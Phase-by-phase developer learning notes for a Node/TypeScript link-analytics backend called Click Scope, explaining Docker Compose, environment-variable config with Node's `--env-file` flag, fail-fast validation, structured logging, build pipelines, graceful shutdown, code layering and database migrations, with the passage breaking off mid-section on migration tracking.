# Notes

Learning notes for Click Scope, written phase by phase. Assumes solid
JavaScript/React knowledge; explains backend and infrastructure concepts
from first principles.

## Phase 1: Project Setup

### Docker and containerization for local development

**What it is.** Docker packages an application (or, here, a piece of
infrastructure like Postgres) together with its exact OS-level
dependencies into an image, then runs that image as an isolated
process called a container. A container is not a VM — it shares the
host's kernel — but it gets its own filesystem, process namespace, and
network interface, so it behaves like a self-contained machine.

**Why it exists in this project.** Click Scope needs PostgreSQL and
Redis to run locally. Without Docker, every contributor would have to
install both natively, matching specific major versions, and manually
manage starting/stopping them and keeping their data separate from any
other project on the same machine. Docker turns that into `docker
compose up -d`.

**How it works mechanically.** An image is a read-only, layered
filesystem snapshot (e.g. `postgres:16` — the official Postgres 16
image on Docker Hub). Running a container adds a thin writable layer on
top. Docker Compose (the `docker-compose.yml` in this repo) describes
one or more containers as "services," how they're networked, and what
storage they get, then creates/starts/stops them together as a unit.

**Where it lives in the codebase.** `docker-compose.yml` at the repo
root. It's infra-as-config, not app code — nothing in `src/` depends on
Docker at all; the app just connects to whatever `DATABASE_URL` /
`REDIS_URL` point at, whether that's the Docker containers, a native
install, or a managed cloud database.

**Common pitfalls.**

- Port collisions: if Postgres or Redis is already running natively on
  5432/6379, `docker compose up` will fail to bind that port. Fix by
  overriding `POSTGRES_PORT`/`REDIS_PORT` in a root `.env` file.
- Forgetting `-v` doesn't delete data: `docker compose down` stops
  containers but keeps the named volume, so old data reappears on the
  next `up`. `docker compose down -v` is the "actually wipe it" command.
- Confusing container-internal and host ports: inside `docker-compose.yml`,
  `${POSTGRES_PORT:-5432}:5432` means "host port : container port" — the
  container always listens on 5432 regardless of what the host-side
  number is.

**Production considerations.** This `docker-compose.yml` is dev-only.
Production Click Scope will connect to managed services (e.g. RDS/Neon
for Postgres, Elasticache/Upstash for Redis) — nobody runs
`docker compose up` in production for a database. What _does_ often
move to production is an application Dockerfile, so the API itself
runs as a container in whatever orchestrator (Kubernetes, ECS, Fly,
etc.) the team uses; that's a separate concern from this compose file
and isn't part of Phase 1.

**Interview answer.** Docker containerizes an application and its
dependencies into a portable, reproducible unit that shares the host
kernel but has its own filesystem and process space, so "works on my
machine" stops being version-drift roulette. For local development,
`docker-compose.yml` declares the supporting services a project needs —
here, Postgres and Redis — as one command, with named volumes for
persistence and healthchecks so dependent services know when it's
actually safe to connect. In production, containers matter more for
the app itself than for managed databases, since most teams outsource
stateful infrastructure to a managed provider and keep containers for
the stateless, horizontally-scalable pieces.

---

### docker-compose: services, ports, named volumes, healthchecks

**What it is.** Four building blocks in `docker-compose.yml`:

- **services** — the list of containers to run (`postgres`, `redis`).
- **ports** — `HOST:CONTAINER` mappings that expose a container's
  network port on the host machine.
- **volumes** (named) — persistent storage managed by Docker, tracked
  by name (`clickscope_postgres_data`) rather than a filesystem path.
- **healthchecks** — a command Docker runs periodically inside the
  container to decide if it's "healthy" versus just "running."

**Why it exists in this project.** Each piece solves a distinct
failure mode:

- Without **ports**, the containers are network-isolated from your
  laptop; the API running on your host couldn't reach Postgres inside
  Docker at all.
- Without **named volumes**, Postgres writes its data files into the
  container's writable layer, which is deleted the moment the
  container is removed — so every `docker compose down` would silently
  wipe the whole database.
- Without **healthchecks**, Docker only knows a container's _process_
  started, not that Postgres has finished initializing and is actually
  ready to accept connections — which matters once something (like a
  future migration step, or another container with `depends_on:
condition: service_healthy`) needs to wait for the database to be
  truly ready, not just "the container object exists."

**How it works mechanically.** `pg_isready` is a real Postgres CLI
tool that attempts a lightweight connection and exits 0 only if the
server will accept one; `redis-cli ping` does the equivalent for
Redis, expecting a `PONG` reply. Docker runs the `test:` command on an
`interval`, and flips the container's status to `healthy` only after
enough consecutive successes — `retries` and `start_period` exist so a
slow first boot doesn't get flagged as broken.

**Where it lives in the codebase.** `docker-compose.yml`, one block per
service.

**Common pitfalls.**

- Treating "container is running" as "database is ready" — a fresh
  Postgres container can take a few seconds to initialize its data
  directory before `pg_isready` succeeds; connecting too early gets a
  connection-refused error that looks like a config problem but is
  actually just a race.
- Renaming a named volume: Docker treats a new volume name as a brand
  new, empty volume — your data isn't "renamed," it's just gone from
  the new container's perspective (the old volume still exists on disk
  under its old name until pruned).
- Hardcoding ports instead of using `${VAR:-default}` — the moment two
  projects on the same machine both hardcode 5432, one of them fails
  to start.

**Production considerations.** None of this ships to production as-is
— production Postgres/Redis are typically managed services with their
own backup, replication, and monitoring, which a local Docker volume
doesn't provide. The healthcheck _pattern_, though, carries over:
production orchestrators use the same idea (liveness/readiness probes)
to decide whether to route traffic to a container.

**Interview answer.** In Compose, `ports` bridges the container's
isolated network to the host so local tools can reach it, `volumes`
give a container's data a lifecycle independent of the container
itself so `docker compose down` doesn't destroy your database, and
`healthchecks` let Docker (and anything depending on the service)
distinguish "the process started" from "the service is actually ready
to do work." I use `pg_isready` and `redis-cli ping` specifically
because they test the real thing you care about — can I open a
connection — rather than just checking that a PID exists.

---

### Environment-based configuration and the twelve-factor principle

**What it is.** Storing everything that varies between environments —
database URLs, ports, log verbosity, secrets — in environment
variables instead of in code or checked-in config files. This is
factor III of the "twelve-factor app" methodology (a widely-referenced
set of conventions for building portable, cloud-ready services).

**Why it exists in this project.** Click Scope will run against a
different Postgres, a different Redis, and different log verbosity in
local dev, CI, staging, and production — with production credentials
that must never be visible in the git history. Putting the _names_ of
required variables in code (this repo's Zod schema) while keeping
their _values_ entirely outside the repo means the same built artifact
runs correctly in any environment just by changing what's injected at
startup, and a leaked laptop or GitHub repo never exposes a production
credential.

**How it works mechanically.** `process.env` is a plain object Node.js
populates from the OS environment the process was started with. This
repo's `src/config/env.ts` defines a Zod schema describing every
variable's shape (required vs. optional, type, allowed values,
defaults); `src/config/index.ts` runs that schema against the real
`process.env` once, at import time, and exports the _validated,
typed_ result as `config`. `.env.example` documents what a developer
needs to set; each person copies it to their own `.env`
(git-ignored, never committed) and fills in real values. The `dev`
script loads that file into `process.env` via Node's built-in
`--env-file` flag before `env.ts`'s Zod schema ever runs — see the
next section for why.

**Where it lives in the codebase.** `src/config/env.ts` (schema +
validation logic), `src/config/index.ts` (the validated, exported
`config` object every other module imports), `.env.example` (the
human-facing checklist), `.env` (per-developer, git-ignored).

**Common pitfalls.**

- Reading `process.env.SOMETHING` directly deep inside a random
  module — it works, but now that variable's existence and type are
  undocumented and unvalidated anywhere; the whole point of a central
  schema is that there's exactly one file describing every variable
  the app needs.
- Assuming `.env` is automatically loaded by Node — it isn't; Node
  does nothing special with a file named `.env` unless something
  loads it explicitly. This project's `dev` script does that loading
  itself via `--env-file` (see the next section); without that flag
  (or an equivalent), a `.env` file sitting on disk has zero effect
  and every `process.env.X` read would just be `undefined`.
- Checking in a real `.env` "just for now" — this is the single most
  common way credentials end up in git history, discoverable forever
  even after a later commit deletes the file.

**Production considerations.** In production, these variables come
from the platform (e.g. a container orchestrator's secret store,
Vercel/Render/Fly environment variable UI, or a dedicated secrets
manager like AWS Secrets Manager) rather than a `.env` file at all —
`.env` is strictly a local-development convenience.

**Interview answer.** Twelve-factor configuration means anything that
differs between environments — URLs, credentials, feature flags — is
injected via environment variables at runtime rather than baked into
the code or a checked-in config file. That's what makes the exact same
build artifact deployable to dev, staging, and production unchanged,
and it's what keeps secrets out of git history. In this project that
takes the shape of a typed, validated config object: a Zod schema
declares every variable's shape once, `process.env` is validated
against it at startup, and the rest of the app imports the resulting
typed object instead of touching `process.env` directly.

---

### Loading `.env` with Node's built-in `--env-file` flag

**What it is.** The `dev` script is
`tsx watch --env-file=.env src/server.ts`. `--env-file` is a flag
built into Node itself (stable since Node 20.6, well within this
repo's `engines: node >=24 <25` requirement): it reads a file of
`KEY=value` lines and copies each one into `process.env` before any
application code runs — no dependency required.

**Why it exists in this project, and why not `dotenv`.** `dotenv` is
an npm package that does the same job by calling `require('dotenv')
.config()` (or an ESM equivalent) at the top of the entrypoint — it
parses `.env` and assigns onto `process.env` in JavaScript, at
runtime, inside the app's own module graph. `--env-file` does the
identical parse-and-assign, but as a Node CLI flag that runs _before_
Node even starts loading `src/server.ts`. Three concrete advantages
follow from that:

- **Zero dependency.** It's one less package in `package.json` to
  install, audit, and keep updated — for a job this small (parse
  `KEY=value` lines), pulling in a third-party package is pure
  surface area with no real benefit.
- **Correct load order, by construction.** Because `--env-file` runs
  before the entrypoint module is evaluated, `process.env` is fully
  populated by the time `src/config/env.ts`'s top-level
  `envSchema.safeParse(process.env)` runs. With `dotenv`, load order
  is a manual discipline the codebase has to get right forever — the
  `import 'dotenv/config'` line has to be the first line executed,
  ahead of any module (including transitively) that reads
  `process.env` at import time. It's an easy thing for a future
  refactor to silently break by reordering imports; `--env-file`
  makes that class of bug structurally impossible here.
- **Same mechanism in dev and prod.** Since production sets real
  environment variables directly (see below) rather than reading a
  file, there's no `dotenv`-specific code path to remember to skip or
  guard with `if (NODE_ENV === 'development')`. Dev-only file loading
  lives entirely in the `dev` npm script, not in application source.

**What happens if `.env` is missing: crash, not silent continue.**
`--env-file=.env` requires that exact file to exist relative to the
current working directory. If it doesn't, Node refuses to start at
all:

```
$ npm run dev
node: .env: not found
```

This exits with a non-zero status code (`9`) before `src/server.ts`
is ever evaluated — so the fail-fast behavior already documented in
[Fail-fast validation at startup](#fail-fast-validation-at-startup)
now starts one layer earlier than the Zod schema. A developer who
never ran `cp .env.example .env` gets one unambiguous error at the
very first `npm run dev`, instead of a `DATABASE_URL` Zod error that
might be mistaken for a config _value_ problem rather than a missing
_file_ problem. (Node also has `--env-file-if-exists`, which loads
the file if present and silently continues if not — deliberately
_not_ used here, since silent continuation followed by twenty Zod
"required" errors is a worse error message than "the file you were
supposed to create doesn't exist.")

**Where it lives in the codebase.** The `--env-file=.env` flag on the
`dev` script in `package.json`. Nothing under `src/` changes — the
Zod validation in `src/config/env.ts` still runs exactly as before;
`--env-file` only changes how `process.env` gets populated _before_
that validation runs.

**Why production doesn't use a `.env` file at all.** `.env` is a
local-development convenience for getting values into `process.env`
without exporting them into your shell by hand. In every real
deployment target, the platform itself injects environment variables
directly into the process — there's no file to load in the first
place:

- A container orchestrator (Kubernetes, ECS, Nomad) sets variables
  from a Secret/ConfigMap object as part of the container's launch
  spec — they exist in the container's environment the instant the
  process starts, the same way exporting a shell variable would.
- A PaaS (Render, Fly, Railway, Heroku) has an environment-variable
  UI/API; whatever you set there is injected into the dyno/machine's
  environment before your start command runs.
- A secrets manager (AWS Secrets Manager, GCP Secret Manager,
  HashiCorp Vault) is fetched by an init step or sidecar and written
  into the environment (or read at startup), often with the added
  benefit of rotation and access auditing that a static file can't
  provide.

The common thread: production credentials never exist as a file
sitting in the deployed artifact or the git history at all — they're
injected by the platform at process-start time, which is exactly what
`--env-file` does locally, just backed by a file instead of a
platform API. This is also why `npm start` (`node dist/server.js`)
deliberately has **no** `--env-file` flag — in production the
variables are already in `process.env` by the time Node starts, so
loading a file would be redundant at best and wrong at worst (a stray
`.env` accidentally left in a production image would then silently
override real platform-injected values).

**Common pitfalls.**

- Adding `--env-file` to `start` (production) as well as `dev` — this
  would make the app depend on a `.env` file existing in the
  production image, undermining the entire point of injecting
  secrets via the platform instead of a checked-in or bundled file.
- Forgetting `--env-file` only affects the process it's passed to —
  `npm test` (`vitest run`) and `npm run build` (`tsc`) don't have it,
  so tests that need environment variables set either mock
  `src/config`, set variables inline, or rely on a separate mechanism
  (e.g. a test-specific `.env.test` loaded by the test runner) — not
  on `dev`'s flag, which never runs during `test` or `build`.
- Confusing "`--env-file` failed to find `.env`" (`node: .env: not
found`, exit code 9) with "`.env` exists but a required variable
  inside it is missing" (a `ZodError`/`EnvValidationError` from
  `parseEnv`, exit code 1) — they're two different fail-fast layers
  with two different fixes: create the file, versus fill in a value
  inside it.

**Production considerations.** Covered above — production environment
variables come from the deployment platform, not a `.env` file, and
`npm start` has no `--env-file` flag for exactly that reason.

**Interview answer.** I load `.env` in development with Node's
built-in `--env-file` flag rather than the `dotenv` package because it
needs zero dependencies and, more importantly, it loads before the
entrypoint module even starts executing — so there's no import-order
footgun where a module reads `process.env` before `dotenv.config()`
has run. If `.env` is missing, `--env-file` fails hard with a nonzero
exit before any application code runs, which is the same fail-fast
philosophy this codebase already applies to config validation — one
clear error at the earliest possible point, rather than a confusing
failure three layers downstream. Production never uses a `.env` file
at all: the deployment platform (container orchestrator, PaaS,
secrets manager) injects environment variables directly into the
process at launch, so `npm start` runs with no `--env-file` flag,
and there's no `.env` file present in the deployed artifact for a
secret to leak from.

---

### Fail-fast validation at startup

**What it is.** Validating all configuration _before_ the app starts
doing anything else, and crashing immediately with a specific error if
it's invalid — rather than starting up successfully and failing later,
confusingly, the first time some code path actually tries to use the
bad value.

**Why it exists in this project.** A misconfigured `DATABASE_URL`
should fail on line one of startup with "DATABASE_URL must be a valid
connection string" — not three requests later as an opaque connection
timeout deep inside a database driver, or worse, silently, if a code
path that needed it just happened not to run during a smoke test. This
matters even more in this codebase because `config.PORT` is used to
coerce a string into a number, and `LOG_LEVEL`/`NODE_ENV` are
constrained to a fixed set of values — bad input here should never
reach `pino()` or `app.listen()` in a half-valid state.

**How it works mechanically.** `envSchema.safeParse(rawEnv)` in
`src/config/env.ts` returns either `{ success: true, data }` or
`{ success: false, error }` — it never throws, which keeps `parseEnv`
itself simple and testable. On failure, `parseEnv` maps every Zod
issue into a `"path: message"` line and throws a single
`EnvValidationError` combining all of them (so one run tells you about
_every_ problem, not just the first). `src/config/index.ts` is the one
place that calls `parseEnv(process.env)` for real: it catches that
error, prints it with `console.error`, and calls `process.exit(1)` —
a nonzero exit code so any process manager or CI job correctly reports
this as a failed start, not a clean shutdown.

**Where it lives in the codebase.** `parseEnv` and `EnvValidationError`
in `src/config/env.ts` (pure, unit-tested in
`tests/config/env.test.ts`); the eager, process-exiting call to it in
`src/config/index.ts`.

**Common pitfalls.**

- Validating lazily (e.g. checking `if (!process.env.DATABASE_URL)`
  only inside the one function that happens to use it) — every other
  variable stays unchecked until its own first use, so a typo in a
  rarely-hit variable can lie dormant for weeks.
- Swallowing the validation error instead of exiting — e.g. logging a
  warning and continuing with `undefined`. That doesn't fail fast, it
  fails _later and less clearly_, usually as a stack trace with no
  obvious connection to the real cause.
- Putting the process-exiting side effect in the same function you
  unit test — if `parseEnv` itself called `process.exit`, testing "does
  this reject an invalid config" would require intercepting
  `process.exit` in every test, which is exactly the trap this repo's
  split between `parseEnv` (pure) and `config/index.ts` (side-effecting)
  avoids.

**Production considerations.** In an orchestrated environment (e.g.
Kubernetes), a nonzero exit code on a config error means the
orchestrator will see the container as crashed and either surface that
clearly in its dashboard or endlessly restart-loop it — which is
_correct_ and desirable: a loud, visible crash beats a silently
half-broken service serving traffic. The specific, itemized error
message is what turns that crash from a 3am mystery into a two-second
fix.

**Interview answer.** Fail-fast validation means checking every piece
of required configuration once, at startup, and refusing to start at
all if anything is missing or malformed — instead of discovering the
problem later, indirectly, when some unrelated code path finally
touches the bad value. I implement this with a Zod schema that
validates the whole environment in one pass and produces a message
naming every invalid variable, then exit the process with a nonzero
code so any process manager correctly reports the failure. I keep the
validation function itself pure — no `process.exit` inside it — so it
stays trivially unit-testable, and put the actual crash-on-failure
behavior in one dedicated place that's only invoked once, for real, at
process startup.

---

### Structured logging vs console.log

**What it is.** `console.log` prints unstructured, freeform text. A
structured logger (Pino, here) emits each log line as a well-defined
record — in production, one JSON object per line — with consistent
fields like `level`, `time`, and `msg`, plus whatever extra structured
context you attach (e.g. `{ port, env }`).

**Why it exists in this project.** Click Scope's later phases add a
BullMQ worker process and multiple concurrent request-handling paths;
once there's more than one place logs come from, or once logs are
shipped to any aggregator, `console.log("server started on port " +
port)` is useless to query ("find every log where port=3000 AND
level=error") while a JSON field is trivial to query. Pino specifically
was chosen over `console.log` (no structure, no levels, can't be
filtered) and over `winston` (a heavier, more configurable alternative
with meaningfully worse raw throughput) because it's one of the
fastest structured loggers for Node and needs almost no configuration
to get JSON-in-production / pretty-in-dev for free via a transport.

**How it works mechanically.** `pino({ level, transport })` in
`src/lib/logger.ts` creates one logger instance for the whole app.
`level` gates verbosity — a `logger.debug(...)` call is a genuine
no-op below its configured level, not just hidden, so it costs almost
nothing in production where `LOG_LEVEL` is typically `info` or higher.
`transport` is `undefined` in production — meaning Pino writes raw
JSON directly to stdout, the fastest path, ready for whatever collects
container logs — and set to `pino-pretty` in development, which
reformats those same JSON records into colorized, human-readable
lines. Calls like `logger.info({ port, env }, "message")` attach
structured fields _and_ a human message to the same record.

**Where it lives in the codebase.** `src/lib/logger.ts` exports the
single shared `logger` instance; `src/server.ts` is the only consumer
so far, logging on startup and during shutdown.

**Common pitfalls.**

- Installing `pino-pretty` only as a dev dependency but then somehow
  needing it in a built/production context — it would throw "unable to
  determine transport target" at runtime. This repo avoids that
  because the transport is conditional on `NODE_ENV === 'development'`,
  so production code never asks Pino to load `pino-pretty` at all.
- Logging secrets or full request bodies "temporarily for debugging" —
  because structured logs are exactly what gets shipped to a
  long-retention aggregator, this is a much easier way to leak a
  credential than a one-off `console.log` that scrolls off a terminal.
- Creating a new `pino()` instance per module instead of importing the
  one shared instance — each instance has its own transport/level
  config, so you'd silently lose the single-source-of-truth log level.

**Production considerations.** JSON-per-line to stdout is the standard
contract most log aggregators (CloudWatch, Datadog, Loki, etc.) expect;
it's also cheap because there's no string-formatting transport step in
the hot path. As the app grows, this is the natural place to add a
request-ID or trace-ID field so every log line from one HTTP request
can be correlated together.

**Interview answer.** Structured logging emits each log line as a
consistent, machine-parseable record — for Pino, JSON in production —
with fields like level and timestamp plus whatever context you attach,
instead of `console.log`'s ad hoc strings. That matters once logs are
aggregated across multiple processes, because you can filter and query
by field instead of grepping text. I export one shared Pino instance
configured from `LOG_LEVEL`, pretty-printed via `pino-pretty` in
development and raw JSON in production, so the same logging calls in
application code produce the right output shape in both environments
without an `if (isDev)` at every call site.

---

### TypeScript build pipeline: dev vs production

**What it is.** Two different ways of turning TypeScript into
something Node can run: in development, `tsx watch src/server.ts`
transpiles and runs TypeScript on the fly, restarting on file changes;
in production, `tsc` compiles every `.ts` file in `src/` into plain
`.js` in `dist/` once, ahead of time, and `node dist/server.js` runs
that compiled output directly — no TypeScript tooling present at
runtime at all.

**Why it exists in this project.** These optimize for different
things. Dev wants fast iteration — `tsx` skips a real type-check and
just strips types (via esbuild) so a save-and-see-the-change loop is
near-instant. Production wants a small, fast, dependency-light
runtime — you don't want `typescript`/`tsx` installed or invoked in a
running container; you want the exact JS that was type-checked and
built in CI, with no on-the-fly transformation happening in the
request path at all.

**How it works mechanically.** `npm run dev` → `tsx watch
src/server.ts`: tsx transpiles TypeScript to JavaScript in memory
(stripping types, not checking them) and re-runs on save. `npm run
build` → `tsc -p tsconfig.json`: this _does_ fully type-check (using
`strict: true` and the other flags in `tsconfig.json`) and emits real
`.js` files into `dist/`, mirroring `src/`'s structure. `npm start` →
`node dist/server.js`: plain Node, no TypeScript involved, running the
already-compiled output. `npm run typecheck` → `tsc --noEmit`: the
same full type-check as `build`, but without writing any files — this
is what CI runs to catch type errors without producing (or needing to
clean up) build artifacts.

One consequence worth calling out explicitly: `tsconfig.json` sets
`"module": "NodeNext"` and `"moduleResolution": "NodeNext"` — meaning
TypeScript resolves modules exactly the way Node's real ESM loader
does. Node's ESM loader requires explicit file extensions on relative
imports, so a source file like `src/server.ts` has to import its
sibling as `import { config } from './config/index.js'` — with a
`.js` extension, even though the actual file on disk is
`config/index.ts`. This looks wrong the first time you see it, but
it's correct: after `tsc` compiles, that import needs to point at the
compiled `.js` file that will actually exist in `dist/`, and Node's
loader won't guess the extension for you at runtime the way a bundler
would.

**Where it lives in the codebase.** `tsconfig.json` (compiler options);
`package.json` scripts (`dev`, `build`, `start`, `typecheck`); every
relative import in `src/**/*.ts` uses the explicit-`.js`-extension
pattern described above.

**Common pitfalls.**

- Importing a sibling file without the `.js` extension (e.g. `from
'./config'`) — `tsx` and most editors won't complain, because tsx's
  transpile-only mode and the TS language service are lenient here,
  but the _compiled_ output under plain Node's ESM loader throws
  `ERR_MODULE_NOT_FOUND` at runtime, since Node has no bundler-style
  extension-guessing.
- Trusting `tsx` in dev to mean "this code type-checks" — it doesn't
  type-check at all, it only strips types. A type error can run fine
  under `npm run dev` and then fail `npm run build`/`typecheck` in CI;
  always run `typecheck` before trusting dev-mode success.
- Running `tsc` without `-p tsconfig.json` (or from the wrong
  directory) and picking up a different/default config than intended.

**Production considerations.** At any real scale, `build` runs once in
CI/CD (not per-instance at deploy time), the resulting `dist/` is what
actually gets shipped, and the container image ideally doesn't even
contain `typescript`/`tsx` as installed dependencies in its final
production stage (a multi-stage Dockerfile — build stage installs
devDependencies and runs `tsc`; final stage copies out only `dist/`
and production `node_modules` — is the standard pattern, and a natural
addition once this project gets a production Dockerfile).

**Interview answer.** In dev, `tsx` transpiles TypeScript on the fly
with no real type-checking, trading correctness guarantees for a fast
restart-on-save loop; in production, `tsc` performs one full,
strict type-check and compiles everything ahead of time into plain
JavaScript that Node runs with zero TypeScript tooling present. The
`typecheck` script runs the same strict compile as `build` but without
emitting files, which is what CI uses to catch type errors on every
change. Because this project's `tsconfig.json` uses `NodeNext` module
resolution to match Node's real ESM loader, every relative import in
source needs an explicit `.js` extension — which looks unusual, but is
required for the compiled output to actually resolve correctly under
plain Node at runtime.

---

### Graceful shutdown and why containers need it

**What it is.** Explicitly handling `SIGTERM`/`SIGINT` so the process
stops accepting new work, finishes in-flight requests, and only then
exits — instead of dying the instant the signal arrives.

**Why it exists in this project.** Every container orchestrator stops
a container the same way: send `SIGTERM`, wait a grace period (commonly
~10-30s), then send `SIGKILL` if it's still running. Node's default
reaction to `SIGTERM` is immediate termination. That's fine for a
process with no state and no open connections, but it's actively
harmful the moment there's an in-flight HTTP response (cut off
mid-write) or, in later phases, an open database pool, a Redis
connection, or a BullMQ worker mid-job — all of which want a chance to
finish or release cleanly rather than be yanked away.

**How it works mechanically.** `src/server.ts` registers a `shutdown`
handler on both `SIGTERM` and `SIGINT` (the latter is what your
terminal sends on Ctrl+C, useful for local dev). The handler calls
`server.close(callback)` — this tells the HTTP server to stop
_accepting new connections_ immediately, while letting any request
that's already in progress finish normally; the callback only fires
once every connection has actually closed. Only then does the process
call `process.exit(0)`. A `setTimeout(..., 10_000).unref()` acts as a
safety net: if something never lets go (a hung keep-alive socket, say)
the process force-exits after 10 seconds instead of hanging until the
orchestrator's patience runs out and sends `SIGKILL` — which would skip
the callback entirely and any cleanup it might have done.

**Where it lives in the codebase.** The `shutdown` function and the
`process.on('SIGTERM'/'SIGINT', shutdown)` registrations at the bottom
of `src/server.ts`.

**Common pitfalls.**

- Not handling the signal at all — the default behavior on `SIGTERM` in
  Node is to terminate the process right away with no cleanup step,
  which is exactly the failure mode graceful shutdown exists to avoid.
- Calling `process.exit()` synchronously _before_ `server.close()`'s
  callback fires — that defeats the entire purpose, since it exits
  before in-flight requests have actually finished.
- No timeout safety net — if a connection genuinely never closes (a
  bug, a slow client, a leaked reference), the process hangs forever
  waiting for `server.close()`'s callback, until the orchestrator gives
  up and `SIGKILL`s it anyway, at which point you got none of the
  benefit and all of the wait.

**Production considerations.** This is the mechanism a rolling
deployment or a horizontal-scaling scale-down relies on to avoid
dropping user requests — the orchestrator sends `SIGTERM` to an
outgoing instance, and (ideally, in combination with removing that
instance from the load balancer _first_) that instance finishes what
it's doing and exits cleanly rather than a client seeing a hard
connection reset. Once this app has a database pool or Redis client,
`shutdown` is exactly where those get closed too, alongside the HTTP
server.

**Interview answer.** Container orchestrators stop containers by
sending SIGTERM and, after a grace period, SIGKILL — and Node's
default response to SIGTERM is to die immediately, which can cut off
in-flight requests and abandon open connections. I handle SIGTERM (and
SIGINT for local Ctrl+C) explicitly: `server.close()` stops accepting
new connections but lets existing ones finish, and the process only
calls `process.exit` once that's actually done, with a timeout as a
safety net in case something never closes. This is what makes rolling
deployments and scale-down events not drop requests for users who are
mid-request when an instance is told to stop.

---

### The routes/services/middleware separation

**What it is.** A folder-level convention splitting the app into three
kinds of code: **routes** (map an HTTP method + path to a handler, and
translate between HTTP concepts and everything else), **services**
(the actual business logic — "create a short link," "record a click,"
"look up analytics" — with no knowledge of Express, `req`, or `res`),
and **middleware** (cross-cutting logic that runs _around_ many routes:
auth, rate limiting, request logging, error handling).

**Why it exists in this project.** Click Scope's routes will need the
same business logic reachable from more than one place — a link
lookup used by the redirect route today might also be needed by an
admin API, a BullMQ worker recomputing stats, or a test, none of which
have an `Express Request` object to hand it. If that logic lives
_inside_ a route handler, it's stuck there. Separating it into a
service function that just takes plain arguments and returns plain
data means the route becomes a thin adapter: parse the HTTP request,
call the service, shape the HTTP response — and the service is usable
and unit-testable anywhere.

**How it works mechanically.** A route file defines something like
`router.post('/links', handler)`, where `handler` pulls whatever it
needs off `req` (body, params, the authenticated user), calls a
service function with those plain values, and writes the service's
return value onto `res`. The service function itself never imports
`express` — it might take a database client and some arguments, run
business logic, and return a plain object or throw a plain error.
Middleware sits in the request pipeline _before_ (or, for error
handlers, after) route handlers run, and every middleware function has
the shape `(req, res, next) => ...` — it either calls `next()` to let
the request continue, or ends the response itself.

**Where it lives in the codebase.** `src/routes/`, `src/services/`,
`src/middleware/` are scaffolded but intentionally empty in this phase
(each holds a `.gitkeep` for now) — no routes, services, or middleware
exist yet, since Phase 1 is tooling only. The one route that does exist
right now, the liveness check in `src/server.ts`, is defined directly
on `app` rather than under `src/routes/` on purpose: it's a throwaway
placeholder for Phase 1, not part of the real route structure that
Phase 2+ will build out under `src/routes/`.

**Common pitfalls.**

- Putting real business logic (validation beyond basic shape-checking,
  database queries, external API calls) directly in a route handler —
  it works until you need that same logic from a second entry point
  (a worker, a CLI script, a test) and discover it's tangled up with
  `req`/`res`.
- Middleware that forgets to call `next()` on a code path that should
  continue — the request just hangs with no response and no error,
  which is a notoriously confusing thing to debug.
- Over-applying middleware globally when it should be scoped to
  specific routes (e.g. an auth check that should only guard certain
  endpoints, applied to the whole app and accidentally locking out a
  public route).

**Production considerations.** This separation is what makes a REST
API testable without spinning up an HTTP server for every test — a
service function can be unit tested by calling it directly with fake
arguments. It also makes it straightforward to reuse logic in the
BullMQ worker process this repo is scaffolded for (`worker/`) without
duplicating it: the worker imports the same service functions the API
routes call, since neither depends on Express.

**Interview answer.** Routes, services, and middleware separate three
different concerns: routes translate HTTP into plain function calls
and back, services hold the actual business logic with no dependency
on Express or the request/response objects, and middleware handles
cross-cutting behavior that wraps many routes, like auth or logging.
The reason this matters in practice is reuse and testability — a
service function can be called from a route, a background worker, or
a test with zero HTTP machinery involved, whereas logic embedded
directly in a route handler is stuck there. It also keeps route
handlers thin and readable: parse the request, call a service, shape
the response.

---

## Phase 2: Database Layer

### Migrations as versioned schema-as-code

**What it is.** Instead of hand-running SQL against the database whenever
the schema needs to change, every change is a small, ordered, checked-in
file (a "migration") with an `up` (apply this change) and a `down` (undo
it). The migration tool applies files in order and remembers which ones
have already run.

**Why it exists in this project.** Click Scope's schema will keep changing
across phases — more tables, new columns, new constraints. Without
migrations, "what does the schema look like right now" has no single
source of truth: it's whatever sequence of manual `ALTER TABLE` commands
someone happened to run, against some particular database, in some
particular order, possibly forgotten. With migrations, the schema is
exactly what `migrations/*.ts` says it is, reproducible on any machine —
a fresh Docker Postgres, a teammate's laptop, CI, production — by running
the same ordered set of files.

**How it works mechanically.** `node-pg-migrate` (installed as a dev
dependency) reads every file in `migrations/`, sorted by the timestamp
prefix in the filename, and runs whichever ones it hasn't already recorded
as applied (see the next section for exactly how it knows). `npm run
migrate:create <name>` scaffolds a new timestamped file with empty `up`/
`down` functions; `npm run migrate:up` runs every pending migration's `up`
in order; `npm run migrate:down` runs the most recently applied
migration's `down`. Each migration file exports `up(pgm)` and `down(pgm)`
functions, where `pgm` is a `MigrationBuilder` with methods like
`createTable`, `addConstraint`, `createIndex`, `dropTable` — these
generate the actual SQL, so migration code stays declarative instead of
raw string SQL.

**Where it lives in the codebase.** `migrations/*.ts` — one file per
schema change so far: `create-users-table`, `create-links-table`,
`create-clicks-table`. `npm run migrate:up`/`migrate:down`/`migrate:create`
in `package.json`.

**Common pitfalls.**

- Editing an already-applied migration file instead of writing a new one —
  anyone who already ran the old version has a different schema than
  anyone who runs the edited version from scratch; migrations are meant to
  be append-only history, not editable in place.
- Forgetting `down` entirely, or writing an incomplete one — it works
  until someone actually needs to roll back, at which point "we never
  tested this" becomes an incident.
- Manually running SQL against a database that's also managed by
  migrations — the migration tracking table (see next section) has no way
  to know about a change it didn't apply, so the tracked history silently
  diverges from the real schema.

**Production considerations.** Migrations run as a deploy step, before the
new application code that depends on the new schema starts serving
traffic (or, for backward-compatible changes, sometimes after — a bigger
topic once this project needs zero-downtime schema changes). They should
never run automatically inside the application's own boot sequence in
production, since a service you're horizontally scaling would then try to
run the same migration from every instance concurrently.

**Interview answer.** Migrations are versioned, checked-in files that
describe schema changes as ordered `up`/`down` code instead of ad hoc SQL
run by hand. The migration tool tracks which ones have already run against
a given database, so the same ordered set of files produces the same
schema anywhere — a fresh environment, a teammate's machine, CI, or
production. I write a new migration for every schema change rather than
editing an old one, because migrations are meant to be a reproducible
history, not a mutable snapshot.

---

### How node-pg-migrate tracks applied migrations

**What it is.** A single table, `pgmigrations` by default, that
node-pg-migrate creates in the target database itself and uses as its own
bookkeeping.

**Why it exists in this project.** Without some record of "which
migrations has this specific database already run," the tool would have
no way to know whether to apply, skip, or re-run any given file — it has
to ask the database, not just look at the filesystem.

**How it works mechanically.** `pgmigrations` has three columns: `id`
(serial), `name` (the migration's filename, minus extension), and `run_on`
(a timestamp). On `up`, node-pg-migrate compares the files in
`migrations/` against the names already present in `pgmigrations`, runs
whichever aren't there yet, and inserts a row for each as it succeeds. On
`down`, it does the reverse and deletes the row. A `check-order` setting
